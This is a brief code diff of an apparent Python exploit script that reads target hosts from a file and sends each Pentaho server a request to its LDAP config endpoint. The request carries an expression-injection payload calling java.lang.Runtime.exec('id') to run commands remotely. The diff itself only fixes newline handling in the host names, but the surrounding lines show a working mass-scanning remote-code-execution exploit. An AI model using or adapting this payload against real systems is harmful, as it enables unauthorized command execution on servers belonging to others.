@@ -2,7 +2,7 @@ import requests
 
 with open("cacti.txt", 'r') as file:
     for line in file:
-        baseurl = 'http://'+line+'/pentaho'
+        baseurl = 'http://'+line.strip('\n')+'/pentaho'
         print(baseurl)
         url = f"{baseurl}/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{{T(java.lang.Runtime).getRuntime().exec('id')}}&mgrDn=a&pwd=a"
         try:
